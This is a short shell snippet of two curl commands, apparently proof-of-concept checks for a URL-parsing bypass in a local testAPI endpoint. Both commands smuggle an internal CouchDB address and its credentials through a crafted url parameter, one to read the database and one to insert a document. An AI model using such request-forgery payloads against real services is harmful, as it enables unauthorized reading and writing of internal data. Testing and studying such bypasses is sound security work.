# Validating URL bypass
curl -vv http://localhost:8080/testAPI?method=GET\&url=http://neptunian:neptunian\@couchdb\:5984\@couchdb\:5984/neptunian

# Validating by inserting a document
curl -vv http://localhost:8080/testAPI?method=POST\&url=http://neptunian:neptunian\@couchdb\:5984\@couchdb\:5984/neptunian